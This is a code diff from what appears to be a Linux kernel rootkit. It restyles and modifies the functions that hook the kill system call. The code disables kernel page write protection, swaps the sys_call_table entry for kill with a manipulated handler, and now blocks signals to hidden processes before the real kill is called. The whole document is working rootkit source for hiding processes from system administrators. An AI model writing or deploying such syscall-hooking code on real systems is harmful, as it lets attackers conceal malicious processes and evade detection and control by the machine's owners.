@@ -44,17 +44,18 @@ static unsigned long kill_lock_flags;
  * If it is, the signal is not send. Otherwise it works normally and calls the original kill.
  */
 asmlinkage long
-manipulated_kill (pid_t pid, int sig)
+manipulated_kill(pid_t pid, int sig)
 {
 	/* lock and increase the call counter */
 	INCREASE_CALL_COUNTER(kill_call_counter, &kill_lock, kill_lock_flags);
 
-	// TODO: check BEFORE calling original_kill but also check if sig is valid before that
-	long retv = (*original_kill) (pid, sig);
-	if(retv == 0 && is_process_hidden(pid)) {
+	long retv;
+
+	if (is_process_hidden(pid)) {
 		retv = -ESRCH;
-		ROOTKIT_DEBUG("Blocked signal %u for process %u - ret: %li\n", sig, pid, retv);
-	}
+		ROOTKIT_DEBUG("Blocked signal %u for process %u\n", sig, pid);
+	} else
+		retv = (*original_kill) (pid, sig);
 
 	/* lock and decrease the call counter */
 	DECREASE_CALL_COUNTER(kill_call_counter, &kill_lock, kill_lock_flags);
@@ -65,11 +66,12 @@ manipulated_kill (pid_t pid, int sig)
  * hooks the system call 'kill'
  */
 void
-hook_kill (void) {
+hook_kill(void)
+{
 	ROOTKIT_DEBUG("Hooking the kill syscall...\n");
-	
-	void **sys_call_table = (void *) sysmap_sys_call_table;
-	
+
+	void **sys_call_table = (void *)sysmap_sys_call_table;
+
 	/* initialize our spinlock for the kill counter */
 	spin_lock_init(&kill_lock);
 
@@ -77,15 +79,15 @@ hook_kill (void) {
 	disable_page_protection();
 
 	/* replace the syscall kill */
-	original_kill = (void *) sys_call_table[__NR_kill];
-	sys_call_table[__NR_kill] = (long *) manipulated_kill;
+	original_kill = (void *)sys_call_table[__NR_kill];
+	sys_call_table[__NR_kill] = (long *)manipulated_kill;
 
 	/* reenable write protection */
 	enable_page_protection();
-	
+
 	/* set to hooked */
 	kill_hooked = 1;
-	
+
 	/* log and return */
 	ROOTKIT_DEBUG("Done.\n");
 	return;
@@ -95,34 +97,34 @@ hook_kill (void) {
  * restores the original system call 'kill'
  */
 void
-unhook_kill (void) {
-	ROOTKIT_DEBUG("Unhooking the kill syscall...\n");
-	
+unhook_kill(void)
+{
+	ROOTKIT_DEBUG("Restoring the original kill syscall...\n");
+
 	/* only do anything if kill is actually hooked */
-	if(!kill_hooked) {
+	if (!kill_hooked) {
 		ROOTKIT_DEBUG("Nothing to do.\n");
 		return;
 	}
-	
-	void **sys_call_table = (void *) sysmap_sys_call_table;
+
+	void **sys_call_table = (void *)sysmap_sys_call_table;
 
 	/* disable write protection */
 	disable_page_protection();
 
 	/* restore the old syscall */
-	sys_call_table[__NR_kill] = (long *) original_kill;
+	sys_call_table[__NR_kill] = (long *)original_kill;
 
 	/* reenable write protection */
 	enable_page_protection();
 
 	/* set to not-hooked */
 	kill_hooked = 0;
-	
+
 	/* ensure that all processes have left our manipulated syscall */
-	while(kill_call_counter > 0) {
+	while (kill_call_counter > 0)
 		msleep(2);
-	}
-	
+
 	/* log and return */
 	ROOTKIT_DEBUG("Done.\n");
 }
